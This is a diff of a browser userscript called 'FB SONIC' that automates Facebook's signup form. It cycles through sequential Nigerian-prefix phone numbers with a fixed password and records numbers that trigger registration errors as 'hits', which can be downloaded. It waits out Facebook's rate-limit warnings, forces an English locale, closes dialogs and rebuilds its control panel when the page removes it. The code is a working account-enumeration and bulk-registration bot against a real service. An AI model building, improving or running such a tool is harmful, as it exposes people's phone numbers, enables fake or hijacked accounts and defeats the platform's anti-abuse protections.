-                <button id="dlBtn" style="padding:2px 6px;background:#0a0a0a;color:#0f0;border:1px solid#333;font-size:8px;cursor:pointer;">📥</button>
-                <button id="clrBtn" style="padding:2px 6px;background:#0a0a0a;color:#f00;border:1px solid#333;font-size:8px;cursor:pointer;">🗑</button>
-                <button id="panelVoiceBtn" style="padding:2px 6px;background:#0a0a0a;color:${vc};border:1px solid ${vc};font-size:8px;cursor:pointer;">🔊 ${vo}</button>
-                <span id="histBtn" style="color:#f66;font-size:9px;font-weight:bold;">HITS: ${hitHistory.length}</span>
-            </div>
-            <div style="display:flex;flex:1;gap:4px;min-height:0;">
-                <div style="flex:3;display:flex;flex-direction:column;min-width:0;">
-                    <div style="display:flex;gap:10px;flex-wrap:wrap;margin-bottom:2px;font-size:9px;">
-                        <span>📞 <span id="phoneDisplay">${COUNTRY_CODE + PREFIX + String(currentNumber).padStart(3, '0')}</span></span>
-                        <span>Progress: <span id="progressDisplay">[░░░░░░░░░░] 0%</span></span>
-                    </div>
-                    <div style="display:flex;gap:10px;flex-wrap:wrap;margin-bottom:2px;font-size:9px;color:#ff0;">
-                        <span>Hits: <span id="hitsDisplay">${hits}</span></span>
-                        <span>Created: <span id="createdDisplay">${created}</span></span>
-                        <span>Left: <span id="leftDisplay">${(MAX_NUMBER + 1) - currentNumber}</span></span>
-                    </div>
-                    <div style="flex:1;display:flex;flex-direction:column;min-width:0;">
-                        <div style="color:#888;font-size:8px;margin-bottom:2px;">LIVE LOG</div>
-                        <div id="fbl" style="flex:1;overflow-y:auto;background:#050505;padding:3px;border:1px solid#222;"></div>
-                    </div>
-                </div>
-            </div>
-            <div style="border-top:1px solid#0f0;margin-top:3px;padding-top:3px;color:#ff0;font-size:8px;display:flex;flex-wrap:wrap;gap:6px;align-items:center;">
-                H:<span id="hc">${hits}</span> C:<span id="cc">${created}</span> #<span id="cl">${currentNumber}</span> PREF:<span id="pl">${PREFIX}</span>
-                DELAY:<span id="sd">${stepDelay}</span>ms
-                CC:<input id="ci" value="${COUNTRY_CODE}" style="width:35px;background:#000;color:#0f0;border:1px solid#0f0;padding:1px;font-size:8px;">
-                PREF:<input id="pi" value="${PREFIX}" style="width:55px;background:#000;color:#0f0;border:1px solid#0f0;padding:1px;font-size:8px;">
-                PW:<input id="pwi" value="${PASSWORD}" style="width:50px;background:#000;color:#0f0;border:1px solid#0f0;padding:1px;font-size:8px;">
-                #:<input id="ni" value="${currentNumber}" style="width:30px;background:#000;color:#0f0;border:1px solid#0f0;padding:1px;font-size:8px;">
-                LIM:<input id="li" value="${rateLimitWait}" style="width:35px;background:#000;color:#f80;border:1px solid#f80;padding:1px;font-size:8px;">ms
-                <button id="ap" style="padding:2px 8px;background:#080;color:#000;border:none;font-size:8px;cursor:pointer;">APPLY</button>
-                <span id="as" style="color:#ff0;"></span>
-            </div>
-        `;
-        document.body.appendChild(d);
+        d.style.cssText =
+            'position:fixed !important;bottom:0 !important;left:0 !important;right:0 !important;height:240px !important;background:#050505 !important;color:#00ff66 !important;z-index:2147483640 !important;font:11px "Courier New",monospace !important;padding:6px !important;border-top:3px solid #00ff66 !important;display:flex !important;flex-direction:column !important;box-shadow:0 -5px 25px rgba(0,0,0,0.9) !important;';
 
+        const country = getCountryName(COUNTRY_CODE);
+        const vo = voiceEnabled ? 'ON' : 'OFF';
+        const vc = voiceEnabled ? '#00ff66' : '#ff4444';
+
+        d.innerHTML =
+            '<div style="display:flex;align-items:center;margin-bottom:4px;gap:6px;flex-wrap:wrap;background:#111;padding:4px 8px;border-radius:4px;">' +
+            '  <b style="color:#00ff66;font-size:12px;">⚡ FB SONIC v25.4 (7s + Voice)</b>' +
+            '  <span id="statusDot" style="color:#888;">⚪</span>' +
+            '  <span id="statusText" style="color:#00ff66;font-weight:bold;">READY</span>' +
+            '  <span style="color:#555;">|</span>' +
+            '  <span style="color:#38bdf8;">⏱️ <span id="timerDisplay">00:00:00</span></span>' +
+            '  <span style="color:#555;">|</span>' +
+            '  <span style="color:#eab308;">⚡ <span id="speedDisplay">0/min</span></span>' +
+            '  <span style="color:#555;">|</span>' +
+            '  <span style="color:#c084fc;">🌍 <span id="countryDisplay">' + country + '</span></span>' +
+            '  <span style="color:#777;font-size:10px;">(Ctrl hides)</span>' +
+            '  <div style="margin-left:auto;display:flex;gap:6px;align-items:center;">' +
+            '    <button id="startBtn" style="padding:4px 14px;background:#00ff66;color:#000;border:none;font-weight:bold;cursor:pointer;border-radius:4px;">START</button>' +
+            '    <button id="dlBtn" title="Download Hits" style="padding:4px 8px;background:#1e293b;color:#00ff66;border:1px solid #334155;cursor:pointer;border-radius:4px;">📥</button>' +
+            '    <button id="clrBtn" title="Clear History" style="padding:4px 8px;background:#1e293b;color:#f87171;border:1px solid #334155;cursor:pointer;border-radius:4px;">🗑</button>' +
+            '    <button id="panelVoiceBtn" style="padding:4px 8px;background:#1e293b;color:' + vc + ';border:1px solid #334155;cursor:pointer;border-radius:4px;">🔊 ' + vo + '</button>' +
+            '    <span id="histBtn" style="color:#f87171;font-weight:bold;padding-left:4px;">HITS: ' + hitHistory.length + '</span>' +
+            '  </div>' +
+            '</div>' +
+            '<div style="display:flex;flex:1;gap:6px;min-height:0;">' +
+            '  <div style="flex:2;display:flex;flex-direction:column;min-width:0;">' +
+            '    <div style="display:flex;gap:12px;margin-bottom:4px;font-size:11px;">' +
+            '      <span>📞 <b id="phoneDisplay" style="color:#38bdf8;">' + COUNTRY_CODE + PREFIX + String(currentNumber).padStart(3, '0') + '</b></span>' +
+            '      <span id="progressDisplay" style="color:#a3e635;">[░░░░░░░░░░] 0%</span>' +
+            '      <span style="color:#fbbf24;">Hits: <b id="hitsDisplay">' + hits + '</b></span>' +
+            '      <span style="color:#4ade80;">Created: <b id="createdDisplay">' + created + '</b></span>' +
+            '      <span style="color:#94a3b8;">Left: <b id="leftDisplay">' + ((MAX_NUMBER + 1) - currentNumber) + '</b></span>' +
+            '    </div>' +
+            '    <div id="fbl" style="flex:1;overflow-y:auto;background:#000;padding:4px;border:1px solid #1e293b;border-radius:4px;font-size:10px;"></div>' +
+            '  </div>' +
+            '  <div style="flex:1;display:flex;flex-direction:column;min-width:0;border-left:1px solid #1e293b;padding-left:6px;">' +
+            '    <div style="color:#888;font-size:10px;margin-bottom:2px;font-weight:bold;">HIT HISTORY (LOG)</div>' +
+            '    <div id="hitlist" style="flex:1;overflow-y:auto;background:#000;border:1px solid #1e293b;border-radius:4px;padding:3px;"></div>' +
+            '  </div>' +
+            '</div>' +
+            '<div style="border-top:1px solid #1e293b;margin-top:4px;padding-top:4px;display:flex;flex-wrap:wrap;gap:6px;align-items:center;font-size:10px;color:#94a3b8;">' +
+            '  CC:<input id="ci" value="' + COUNTRY_CODE + '" style="width:40px;background:#0a0a0a;color:#00ff66;border:1px solid #334155;padding:1px 3px;border-radius:2px;">' +
+            '  PREF:<input id="pi" value="' + PREFIX + '" style="width:70px;background:#0a0a0a;color:#00ff66;border:1px solid #334155;padding:1px 3px;border-radius:2px;">' +
+            '  PW:<input id="pwi" value="' + PASSWORD + '" style="width:75px;background:#0a0a0a;color:#00ff66;border:1px solid #334155;padding:1px 3px;border-radius:2px;">' +
+            '  #:<input id="ni" value="' + currentNumber + '" style="width:36px;background:#0a0a0a;color:#00ff66;border:1px solid #334155;padding:1px 3px;border-radius:2px;">' +
+            '  LIM:<input id="li" value="' + rateLimitWait + '" style="width:44px;background:#0a0a0a;color:#f59e0b;border:1px solid #334155;padding:1px 3px;border-radius:2px;">ms' +
+            '  STEP:<input id="sdi" value="' + stepDelay + '" style="width:40px;background:#0a0a0a;color:#38bdf8;border:1px solid #334155;padding:1px 3px;border-radius:2px;">ms' +
+            '  <button id="ap" style="padding:2px 10px;background:#0284c7;color:#fff;border:none;cursor:pointer;border-radius:2px;font-weight:bold;">APPLY</button>' +
+            '  <span id="as" style="color:#00ff66;"></span>' +
+            '</div>';
+
+        safeAppend(d);
         installCtrlListener();
+        ensureTopPill();
 
-        document.getElementById('startBtn').addEventListener('click', function() {
+        document.getElementById('startBtn')?.addEventListener('click', function() {
             if (loopStarted) {
-                loopStarted = false; GM_setValue('autoResume', false); save();
-                this.textContent = 'START'; this.style.color = '#0f0';
-                log('⏹ STOPPED', '#ff0');
-                document.getElementById('statusText').textContent = 'STOPPED';
-                document.getElementById('statusDot').style.color = '#888';
+                loopStarted = false;
+                _GM_setValue('autoResume', false);
+                save();
+                this.textContent = 'START';
+                this.style.background = '#00ff66';
+                this.style.color = '#000';
+                log('⏹ LOOP STOPPED BY USER', '#ffbb00');
+                const st = document.getElementById('statusText');
+                const sd = document.getElementById('statusDot');
+                if (st) st.textContent = 'STOPPED';
+                if (sd) { sd.textContent = '⚪'; sd.style.color = '#888'; }
                 return;
             }
-            loopStarted = true; GM_setValue('autoResume', false); save();
-            this.textContent = 'STOP'; this.style.color = '#f00';
-            log('🚀 SONIC STARTED', '#0ff');
-            document.getElementById('statusText').textContent = 'RUNNING';
-            document.getElementById('statusDot').style.color = '#0f0';
+            loopStarted = true;
+            _GM_setValue('autoResume', false);
+            save();
+            this.textContent = 'STOP';
+            this.style.background = '#ef4444';
+            this.style.color = '#fff';
+            log('🚀 SONIC LOOP STARTED', '#00ff66');
+            const st = document.getElementById('statusText');
+            const sd = document.getElementById('statusDot');
+            if (st) st.textContent = 'RUNNING';
+            if (sd) { sd.textContent = '🟢'; sd.style.color = '#00ff66'; }
             loop();
         });
 
-        document.getElementById('dlBtn').addEventListener('click', downloadHits);
-        document.getElementById('clrBtn').addEventListener('click', () => {
-            if (confirm('Clear all ' + hitHistory.length + ' hits?')) {
-                hitHistory = []; save(); refreshHistory();
-                document.getElementById('histBtn').textContent = 'HITS: 0'; updateStats();
+        document.getElementById('dlBtn')?.addEventListener('click', downloadHits);
+        document.getElementById('clrBtn')?.addEventListener('click', () => {
+            if (confirm('Clear all logged hits?')) {
+                hitHistory = [];
+                save();
+                refreshHistory();
+                updateStats();
             }
         });
 
-        document.getElementById('panelVoiceBtn').addEventListener('click', function() {
+        document.getElementById('panelVoiceBtn')?.addEventListener('click', function() {
             voiceEnabled = !voiceEnabled;
             save();
-            let vo2 = voiceEnabled ? 'ON' : 'OFF';
-            let vc2 = voiceEnabled ? '#0f0' : '#f00';
+            const vo2 = voiceEnabled ? 'ON' : 'OFF';
+            const vc2 = voiceEnabled ? '#00ff66' : '#ef4444';
             this.textContent = '🔊 ' + vo2;
             this.style.color = vc2;
-            this.style.borderColor = vc2;
         });
 
-        document.getElementById('ap').addEventListener('click', () => {
-            COUNTRY_CODE = document.getElementById('ci').value.trim() || '+234';
-            PREFIX = document.getElementById('pi').value.trim() || '9053237';
-            PASSWORD = document.getElementById('pwi').value.trim() || PASSWORD;
-            let nn = parseInt(document.getElementById('ni').value);
-            if (nn >= 0 && nn <= MAX_NUMBER) currentNumber = nn;
-            let rl = parseInt(document.getElementById('li').value);
-            if (rl >= 0 && rl <= 60000) rateLimitWait = rl;
-            GM_setValue('autoResume', false); save();
-            document.getElementById('as').textContent = 'OK'; updateStats();
-            setTimeout(() => location.reload(), 400);
+        document.getElementById('ap')?.addEventListener('click', () => {
+            COUNTRY_CODE = (document.getElementById('ci')?.value || '+234').trim();
+            PREFIX = (document.getElementById('pi')?.value || '9053237').trim();
+            PASSWORD = (document.getElementById('pwi')?.value || PASSWORD).trim();
+            const nn = parseInt(document.getElementById('ni')?.value || '0', 10);
+            if (!isNaN(nn) && nn >= 0 && nn <= MAX_NUMBER) currentNumber = nn;
+            const rl = parseInt(document.getElementById('li')?.value || '1500', 10);
+            if (!isNaN(rl) && rl >= 0) rateLimitWait = rl;
+            const sdVal = parseInt(document.getElementById('sdi')?.value || '0', 10);
+            if (!isNaN(sdVal) && sdVal >= 0) stepDelay = sdVal;
+
+            _GM_setValue('autoResume', false);
+            save();
+            
+            const cDisplay = document.getElementById('countryDisplay');
+            if (cDisplay) cDisplay.textContent = getCountryName(COUNTRY_CODE);
+            
+            updateStats();
+
+            const as = document.getElementById('as');
+            if (as) as.textContent = '✓ Saved & Updated';
+            setTimeout(() => { if (as) as.textContent = ''; }, 2000);
         });
-
-        if (loopStarted && GM_getValue('autoResume', false)) {
-            GM_setValue('autoResume', false); save();
-            document.getElementById('startBtn').textContent = 'STOP';
-            document.getElementById('startBtn').style.color = '#f00';
-            document.getElementById('statusText').textContent = 'RUNNING';
-            document.getElementById('statusDot').style.color = '#0f0';
-            log('🔄 Auto-resumed after refresh', '#0ff');
-
-            if (pendingCountdown) {
-                let phone = COUNTRY_CODE + PREFIX + String(currentNumber).padStart(3, '0');
-                countdown54321(phone);
-                setTimeout(() => { loop(); }, 5200);
-            } else {
-                loop();
-            }
-        } else if (loopStarted) {
-            loopStarted = false; save();
-        }
 
         refreshHistory();
         updateStats();
     }
 
     function log(msg, c) {
-        c = c || '#0f0';
+        c = c || '#00ff66';
         createPanel();
-        let l = document.getElementById('fbl');
+        const l = document.getElementById('fbl');
         if (!l) return;
-        let e = document.createElement('div');
+        const e = document.createElement('div');
         e.style.color = c;
+        e.style.marginBottom = '1px';
         e.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
         l.prepend(e);
-        while (l.children.length > 80) l.lastChild.remove();
+        while (l.children.length > 100) {
+            l.lastChild?.remove();
+        }
         updateStats();
     }
 
-    function u() {
-        let hc = document.getElementById('hc'), cc = document.getElementById('cc'), cl = document.getElementById('cl'), pl = document.getElementById('pl'), sd = document.getElementById('sd');
-        if (hc) hc.textContent = hits;
-        if (cc) cc.textContent = created;
-        if (cl) cl.textContent = currentNumber;
-        if (pl) pl.textContent = PREFIX;
-        if (sd) sd.textContent = stepDelay;
-        updateStats();
+    function wait(ms) {
+        return new Promise(resolve => setTimeout(resolve, ms));
     }
-
-    function wait(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }
-
-    function typeFast(el, text) {
-        el.focus();
-        el.value = text;
-        el.dispatchEvent(new Event('input', { bubbles: true }));
-        el.dispatchEvent(new Event('change', { bubbles: true }));
-    }
-
-    function clickFast(el) { el.click(); }
 
     function closePopup() {
-        let all = document.querySelectorAll('button, a, div[role="button"], span');
-        for (let el of all) {
-            let text = el.textContent || '';
-            if (text.trim().toLowerCase() === 'close' && el.offsetParent) {
+        const buttons = document.querySelectorAll('button, div[role="button"], span');
+        for (const el of buttons) {
+            if (el.closest('#fbx') || el.closest('#binary-screen') || el.closest('#typeme-top-pill')) continue;
+            const text = (el.textContent || '').trim().toLowerCase();
+            if ((text === 'close' || text === 'not now' || text === 'ok' || text === 'dismiss') && el.offsetParent) {
                 el.click();
                 return true;
             }
@@ -648,153 +646,177 @@
         return false;
     }
 
-    function getPF() {
-        return document.querySelector('input[name="reg_email__"]') ||
-               document.querySelector('input[aria-label*="Mobile"]') ||
-               document.querySelector('input[aria-label*="email"]') ||
-               document.querySelector('input[aria-label*="number"]');
-    }
-
-    function getPW() { return document.querySelector('input[type="password"]'); }
-
     async function step() {
         if (!loopStarted || working || paused) return;
 
         if (currentNumber > MAX_NUMBER) {
-            let oldPref = PREFIX;
-            PREFIX = String(parseInt(PREFIX) + 1);
+            const oldPref = PREFIX;
+            PREFIX = String(parseInt(PREFIX, 10) + 1);
             PASSWORD = PREFIX;
             currentNumber = 0;
             save();
-            log('🔄 PREFIX: ' + oldPref + ' -> ' + PREFIX, '#ff0');
-            log('🔑 PW updated: ' + PASSWORD, '#ff0');
-            u();
+            log('🔄 PREFIX ROLLED: ' + oldPref + ' -> ' + PREFIX, '#ffbb00');
+            log('🔑 New Password: ' + PASSWORD, '#ffbb00');
+            updateStats();
             return;
         }
 
-        let phone = COUNTRY_CODE + PREFIX + String(currentNumber).padStart(3, '0');
-        let body = document.body.innerText;
-        let url = location.href;
+        const phone = COUNTRY_CODE + PREFIX + String(currentNumber).padStart(3, '0');
+        const body = (document.body ? document.body.innerText : '') || '';
+        const url = window.location.href;
 
-        if (!url.includes('signup') && url.includes('facebook.com')) {
-            created++; GM_setValue('autoResume', false); save();
-            log('✅ CREATED: ' + phone, '#0f0');
-            document.getElementById('statusText').textContent = 'CREATED!';
-            document.getElementById('statusDot').style.color = '#0f0';
-            loopStarted = false; save();
+        // Force English Locale to prevent translation
+        if (url.includes('facebook.com') && !url.includes('locale=')) {
+            window.location.href = url.includes('?') ? url + '&locale=en_US' : url + '?locale=en_US';
+            return;
+        }
+
+        if (!url.includes('signup') && !url.includes('r.php') && url.includes('facebook.com') && attempts > 0) {
+            created++;
+            _GM_setValue('autoResume', false);
+            save();
+            log('✅ ACCOUNT DISCOVERED / REDIRECTED: ' + phone, '#00ff66');
+            const st = document.getElementById('statusText');
+            if (st) st.textContent = 'CREATED!';
+            loopStarted = false;
+            save();
             showBinaryScreen(phone, PASSWORD);
             return;
         }
 
-        if (body.includes("You Can't Use This Feature") || body.includes("going too fast") || body.includes("significantly slow down")) {
-            log('⛔ RATE LIMIT! Waiting ' + rateLimitWait + 'ms...', '#f00');
-            document.getElementById('statusText').textContent = 'LIMIT';
-            document.getElementById('statusDot').style.color = '#f00';
+        if (body.includes("You Can't Use This Feature") ||
+            body.includes("going too fast") ||
+            body.includes("significantly slow down") ||
+            body.includes("Try again later")) {
+            log('⛔ RATE LIMIT ENCOUNTERED. Cooling down for ' + rateLimitWait + 'ms...', '#ef4444');
+            const st = document.getElementById('statusText');
+            const sd = document.getElementById('statusDot');
+            if (st) st.textContent = 'RATE-LIMIT';
+            if (sd) sd.style.color = '#ef4444';
             closePopup();
             working = true;
             await wait(rateLimitWait);
             working = false;
-            document.getElementById('statusText').textContent = 'RUNNING';
-            document.getElementById('statusDot').style.color = '#0f0';
-            u();
+            if (st) st.textContent = 'RUNNING';
+            if (sd) sd.style.color = '#00ff66';
+            updateStats();
             return;
         }
 
-        if (body.includes('Something went wrong') || body.includes('Sorry, something went wrong')) {
+        if (body.includes('Something went wrong') ||
+            body.includes('Sorry, something went wrong') ||
+            body.includes('Please re-enter your password') ||
+            body.includes('The email or mobile number you entered isn')) {
             closePopup();
-            await wait(100);
-            let newUrl = location.href;
-            if (!newUrl.includes('signup') && newUrl.includes('facebook.com')) {
-                created++; GM_setValue('autoResume', false); save();
-                log('✅ CREATED: ' + phone, '#0f0');
-                document.getElementById('statusText').textContent = 'CREATED!';
-                document.getElementById('statusDot').style.color = '#0f0';
-                loopStarted = false; save();
-                showBinaryScreen(phone, PASSWORD);
-            } else {
-                log('🔴 HIT: ' + phone, '#f44');
-                document.getElementById('statusText').textContent = 'HIT!';
-                document.getElementById('statusDot').style.color = '#f00';
-                addHit(phone);
-                hits++;
-                currentNumber++;
-
-                pendingCountdown = true;
-                GM_setValue('pendingCountdown', true);
-                GM_setValue('autoResume', true);
-                GM_setValue('loopStarted', true);
-                loopStarted = true;
-                save();
-                u();
-
-                log('🔄 Refreshing page...', '#0ff');
-                setTimeout(() => { location.reload(); }, 300);
-            }
+            await wait(50);
+            log('🔴 HIT DETECTED: ' + phone, '#f87171');
+            const st = document.getElementById('statusText');
+            const sd = document.getElementById('statusDot');
+            if (st) st.textContent = 'HIT!';
+            if (sd) sd.style.color = '#ef4444';
+            addHit(phone);
+            hits++;
+            currentNumber++;
+            pendingCountdown = true;
+            _GM_setValue('pendingCountdown', true);
+            save();
+            
+            startCountdown7(phone);
+            
             return;
         }
 
-        if (lastSubmitted === phone && !body.includes('Something went wrong') && !body.includes('Sorry')) {
-            log('⏭️ SKIP: ' + phone, '#888');
+        if (lastSubmitted === phone && !body.includes('went wrong')) {
+            log('⏭️ Skipping duplicate: ' + phone, '#94a3b8');
             currentNumber++;
             save();
-            u();
             lastSubmitted = '';
+            updateStats();
             return;
         }
 
         closePopup();
+        const pf = getPF();
+        const pw = getPW();
 
-        let pf = getPF();
-        let pw = getPW();
         if (!pf || !pw) {
-            if (!url.includes('signup')) {
-                log('🔄 Redirecting to signup...', '#aaa');
-                window.location.href = 'https://business.facebook.com/signup';
+            const createAccBtn = document.querySelector('a[data-testid="open-registration-form-button"]') ||
+                                 document.querySelector('a[role="button"][ajaxify*="reg"]');
+            if (createAccBtn && createAccBtn.offsetParent) {
+                log('🖱 Opening Facebook registration modal...', '#38bdf8');
+                createAccBtn.click();
+                await wait(100);
+                return;
             }
+            log('⚠️ Waiting for registration inputs on page...', '#94a3b8');
+            await wait(100);
             return;
         }
 
         working = true;
         lastSubmitted = phone;
         attempts++;
-        pf.value = '';
-        pw.value = '';
 
-        clickFast(pf);
+        fillAuxiliaryFields();
         typeFast(pf, phone);
-        clickFast(pw);
         typeFast(pw, PASSWORD);
 
-        let btn = document.querySelector('button[name="websubmit"]') ||
-                  document.querySelector('button[type="submit"]') ||
-                  document.querySelector('button');
-        if (btn && btn.offsetParent) {
+        const btn = getSubmitButton();
+        if (btn) {
             clickFast(btn);
-            log('📤 ' + phone, '#aaa');
+            log('📤 Submitted: ' + phone, '#38bdf8');
+        } else {
+            log('⚠️ Submit button not found or hidden', '#f59e0b');
         }
 
         working = false;
-        await wait(5);
     }
 
     async function loop() {
         while (loopStarted) {
             await step();
-            await wait(10);
+            if (stepDelay > 0) {
+                await wait(stepDelay);
+            }
         }
     }
 
-    let curUrl = location.href;
-    if (!curUrl.includes('signup') && curUrl.includes('facebook.com') && GM_getValue('loopStarted', false)) {
-        let phone = COUNTRY_CODE + PREFIX + String(currentNumber).padStart(3, '0');
-        created++; GM_setValue('created', created);
-        GM_setValue('loopStarted', false); GM_setValue('autoResume', false); save();
-        setTimeout(() => { showBinaryScreen(phone, PASSWORD); }, 500);
+    function startWatchdog() {
+        setInterval(() => {
+            if (!document.getElementById('fbx')) {
+                console.log("[type.me] Restoring panel after DOM change...");
+                createPanel();
+            }
+            if (!document.getElementById('typeme-top-pill')) {
+                ensureTopPill();
+            }
+        }, 1500);
     }
 
-    createPanel();
-    log('⚡ SONIC v2 FINAL | 🌍 ' + getCountryName(COUNTRY_CODE), '#0f0');
-    log('📞 ' + PREFIX + ' | 🔑 ' + PASSWORD, '#0ff');
-    log('🔊 Voice: ' + (voiceEnabled ? 'ON' : 'OFF'), voiceEnabled ? '#0f0' : '#f00');
-    log('⌨️ Tap CTRL to hide/show panel', '#0ff');
+    if (typeof GM_registerMenuCommand === 'function') {
+        GM_registerMenuCommand('⚡ Show / Reset SONIC Panel', () => {
+            const el = document.getElementById('fbx');
+            if (el) el.remove();
+            createPanel();
+        });
+        GM_registerMenuCommand('🚀 Start / Stop Loop', () => {
+            document.getElementById('startBtn')?.click();
+        });
+    }
+
+    function init() {
+        ensureTopPill();
+        createPanel();
+        startWatchdog();
+        log('⚡ SONIC v25.4 ULTIMATE ACTIVE', '#00ff66');
+        log('🌍 Country: ' + getCountryName(COUNTRY_CODE) + ' (' + COUNTRY_CODE + ')', '#38bdf8');
+        log('📞 Current: ' + PREFIX + String(currentNumber).padStart(3, '0') + ' | PW: ' + PASSWORD, '#a3e635');
+        log('⌨️ Shortcut: Tap CTRL to toggle panel visibility', '#c084fc');
+    }
+
+    if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', init);
+    } else {
+        init();
+    }
 })();
